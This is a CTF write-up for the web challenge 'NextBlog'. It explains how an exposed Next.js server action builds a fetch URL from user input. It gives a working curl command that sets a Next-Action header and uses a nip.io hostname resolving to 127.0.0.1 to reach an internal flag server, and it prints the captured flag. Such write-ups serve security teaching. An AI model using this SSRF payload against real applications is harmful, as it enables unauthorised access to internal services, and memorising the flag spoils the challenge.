---
title: "Web - NextBlog"
date: 2026-05-10
tags: ["Web", "CyCTF-Luxor"]
categories: ["Machines&Challenges"]
difficulty: "None"
author: "z3r0s"
---

# NextBlog - CTF Writeup

## Challenge Info
- **Name:** NextBlog
- **URL:** `https://cyctf-luxor-cbaff7649acb-nextblog-0-0.chals.io`
- **Category:** Web
- **Flag:** `CyCTF{F7oXj5sHY4xfvfrIo2x2pkbr4eIVEW3DoYSQe1WHsx_iffn39-InchEsJKhkGtnfg8VA60x6WfCvKRQjmHzftiAxx1TvnXF8FA}`

## Overview

A Next.js 16 blog application with a hidden flag server running on `localhost:3001`. The goal is to exploit a Server-Side Request Forgery (SSRF) vulnerability in a server action to reach the internal flag server.

## Architecture

- **Next.js app** on port 3000 (public)
- **Flag server** (`fserver.js`) on port 3001 (internal only, serves flag at `GET /flag`)
- Both run in the same Docker container via `start.sh`

## Vulnerability Analysis

### Server Actions (`app/actions.ts`)

Two exported server actions handle image fetching:

**`getImageAsDataUrl(imageName)`** - Has a regex filter and `/` prepend:
```javascript
let safelink = imageName.replace(/(\.\/|\/\.|\.\\|\\\.|\.\.)/g, '');
if (safelink[0] !== '/') {
  safelink = '/' + safelink;
}
const { buffer, contentType } = await fetchImage(safelink)
```

**`fetchImage(imageName)`** - No filter, no prepend:
```javascript
const imageUrl = `http://res.cloudinary.com${imageName}`
const response = await fetch(imageUrl)
```

Both are exported from a `'use server'` file, making them callable directly as server actions from any client.

### Key Constraints

1. `getImageAsDataUrl` strips path traversal patterns (`./`, `/.`, `.\`, `\.`, `..`) and always prepends `/` if missing, making host manipulation impossible.
2. `fetchImage` has **no sanitization** but Node.js `fetch()` rejects URLs containing userinfo (`@`), blocking the classic `http://host@evil/` SSRF trick.

## Exploitation

### Finding Server Action IDs

Fetched the JavaScript chunk `b2ee5571784defbf.js` from the app, which contained:
```javascript
createServerReference("40ec89965acdd40cb2b0164cce82150933f70274c4", ..., "getImageAsDataUrl")
createServerReference("40d2dd1312f69711017b1742d0b5b19bb2e279f6aa", ..., "fetchImage")
```

### SSRF via DNS Rebinding (nip.io)

Since `fetchImage` constructs the URL as `http://res.cloudinary.com${imageName}`, passing `.127.0.0.1.nip.io:3001/flag` creates:

```
http://res.cloudinary.com.127.0.0.1.nip.io:3001/flag
```

- **Host:** `res.cloudinary.com.127.0.0.1.nip.io` (resolves to `127.0.0.1` via nip.io)
- **Port:** `3001`
- **Path:** `/flag`
- **No userinfo** - passes Node.js fetch validation

### Exploit Command

```bash
curl -s -X POST 'https://cyctf-luxor-cbaff7649acb-nextblog-0-0.chals.io/' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -H 'Next-Action: 40d2dd1312f69711017b1742d0b5b19bb2e279f6aa' \
  -d '[ ".127.0.0.1.nip.io:3001/flag"]'
```

The response contains the flag as a serialized Buffer, which decodes to the flag string.

## Key Takeaways

1. **Server actions are RPC endpoints** - Any exported async function in a `'use server'` file can be called directly with arbitrary arguments, regardless of how the UI uses it.
2. **Filter bypass via unfiltered function** - `getImageAsDataUrl` had sanitization, but `fetchImage` (also exposed) did not.
3. **DNS rebinding bypasses host restrictions** - Services like `nip.io` resolve `*.127.0.0.1.nip.io` to `127.0.0.1`, allowing SSRF without URL userinfo (which `fetch()` rejects).


<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>
